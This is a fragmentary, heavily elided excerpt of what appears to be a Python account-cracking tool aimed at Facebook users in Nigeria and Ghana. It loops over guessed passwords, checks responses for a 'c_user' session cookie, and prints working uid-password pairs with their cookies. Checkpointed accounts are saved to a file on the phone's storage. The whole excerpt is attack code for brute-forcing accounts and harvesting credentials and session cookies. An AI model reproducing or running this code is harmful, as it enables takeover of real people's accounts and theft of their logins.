...
def Tabii():
    ...
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mNIGERA ENTER ANY CODES EXAMPLE :👇\033[0;m]")
    print(f"")
    ...
    print(f"")
    linex()
    print(f"        \x1b[97m[\033[95;42mGHANA ENTER ANY CODES EXAMPLE :👇\033[0;m]")
    print(f"")
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                os.system("play-audio dapet.mp3")
                print('     \033[1;32m[MARK-OK] '+uid+' | '+ps+
'\n\033[1;37mCookies :\033[1;34m'+coki+'\033[0;97m')
                ...
                cid=coki[24:39]
                Red = '\033[1;31m'
                print('     \033[1;33m[MARK-CP] '+uid+' | '+ps+'\033[0;97m')
                ...
                open('/sdcard/MARK-2F.txt', 'a').write(uid+' | '+ps+'\n')
                twf.append(cid)
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[ MARK ] [%s] \33[1;97m[OK:- %s CP:- %s]\r'%(loop,len(oks),len(cps))), 
        sys.stdout.flush()
        checks(oks,cps,twf)
    except:
        pass
